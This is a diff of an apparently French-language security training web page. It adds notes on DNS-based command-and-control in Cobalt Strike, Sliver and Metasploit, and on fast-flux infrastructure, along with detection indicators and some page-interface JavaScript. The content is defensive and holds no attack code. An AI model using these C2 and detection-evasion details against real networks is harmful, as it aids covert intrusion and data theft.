+    · <strong>Cobalt Strike</strong> : DNS Beacon — interroge le C2 via requêtes A/AAAA/TXT<br>
+    · <strong>Sliver</strong> : DNS C2 intégré<br>
+    · <strong>Metasploit</strong> : DNS staged payloads<br><br>
+    <strong>IOCs</strong> :<br>
+    · Réponses TXT contenant des données binaires ou Base64<br>
+    · Requêtes régulières vers un domaine avec TTL très bas<br>
+    · Sysmon EID 22 : processus suspect faisant des requêtes DNS en boucle`
+  },
+  fastflux: {
+    icon:'🌊', name:'Fast Flux — Infrastructure C2 résiliente',
+    body:`<strong>Mécanisme</strong> : le TTL DNS est réglé très bas (30-60s) et l'IP associée change à chaque résolution. Les IPs sont celles de machines compromises (botnet) qui relaient le trafic vers le vrai C2. Rend le blocage par IP inefficace.<br><br>
+    <strong>Types</strong> :<br>
+    · <strong>Single Flux</strong> : les IPs des A records changent constamment<br>
+    · <strong>Double Flux</strong> : à la fois les A records ET les NS records changent → rend le takedown encore plus difficile<br><br>
+    <strong>IOCs</strong> :<br>
+    · TTL très bas (&lt; 30s, parfois &lt; 5s)<br>
+    · L'IP change entre deux résolutions successives du même domaine<br>
+    · Dig : <code>dig domain.com</code> deux fois à 30s d'intervalle → deux IPs différentes<br>
+    · VirusTotal : l'historique DNS montre des dizaines d'IPs différentes`
+  }
+};
+
+function showExfil(key) {
+  var d = exfilDetails[key];
+  if(!d) return;
+  document.querySelectorAll('.meta-card').forEach(function(c){c.classList.remove('sel');});
+  var p = document.getElementById('exfil-detail');
+  p.className = 'meta-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.name+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+// ── Scroll progress ──
+(function(){
+  var bar = document.getElementById('scroll-progress');
+  var btn = document.getElementById('back-top');
+  window.addEventListener('scroll', function(){
+    var doc = document.documentElement;
+    var scrolled = doc.scrollTop || document.body.scrollTop;
+    var total = doc.scrollHeight - doc.clientHeight;
+    if(bar) bar.style.width = (total > 0 ? (scrolled/total*100) : 0)+'%';
+    if(btn) btn.classList.toggle('visible', scrolled > 300);
+  });
+})();
 </script>
 
 <!-- Notes utilisateur (CAS-IN v2.16) -->
 <script src="../js/components/fiche-notes.js" defer></script>
 <script src="../js/components/theme-toggle.js" defer></script>
 <script src="../js/components/fiche-common.js" defer></script>
-    <script src="../js/components/fiche-reader.js" defer></script>
+<script src="../js/components/fiche-reader.js" defer></script>
 <script src="../js/components/fiche-search.js" defer></script>
 <script src="../js/components/search-modal.js" defer></script>
 <script src="../js/components/fiche-related.js" defer></script>
-</body></html>
+</body>
+</html>
